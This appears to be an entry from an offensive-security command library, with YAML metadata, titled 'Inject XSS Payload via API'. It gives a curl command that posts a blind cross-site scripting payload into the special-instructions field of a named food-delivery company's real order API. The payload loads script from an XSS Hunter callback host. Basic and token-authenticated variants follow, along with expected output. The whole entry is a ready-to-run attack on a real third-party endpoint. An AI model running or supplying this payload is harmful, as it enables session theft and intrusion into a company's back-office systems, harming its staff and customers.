---
data: >-
  curl -X POST 'https://api.zomato.com/order' -d 'special_instructions="><script
  src=https://{$handle}.xss.ht></script>"'
tags:
  - xss
  - api
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: cd4a08a6-c46b-4992-83f3-ffe16f501706
created_at: '2025-12-13T23:56:20.288Z'
updated_at: '2025-12-13T23:56:20.288Z'
verified: false
validated: true
submitted: true
---
# Inject XSS Payload via API

## Command

```bash
curl -X POST 'https://api.zomato.com/order' -d 'special_instructions="><script src=https://{$handle}.xss.ht></script>"'
```

## Description

This command uses curl to send a POST request to an API endpoint, injecting a blind XSS payload into the special instructions parameter. It is used to exploit vulnerabilities where user input is not sanitized before being displayed in back-end interfaces.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `'https://api.zomato.com/order'` | The target API endpoint | Yes |
| `-d 'special_instructions=...'` | The data payload with XSS script | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://api.zomato.com/order' -d 'special_instructions="><script src=https://example.xss.ht></script>"'
```

### Advanced Usage

```bash
curl -X POST 'https://api.zomato.com/order' -H 'Authorization: Bearer token' -d 'special_instructions="><script src=https://{$handle}.xss.ht></script>"'
```

## Expected Output

A successful response from the API indicating order placement, such as HTTP 200 OK with order confirmation JSON.

## Related

- [[procedures/Inject-Blind-XSS-Payload-into-API-Parameter]]
- [[tools/XSS-Hunter]]
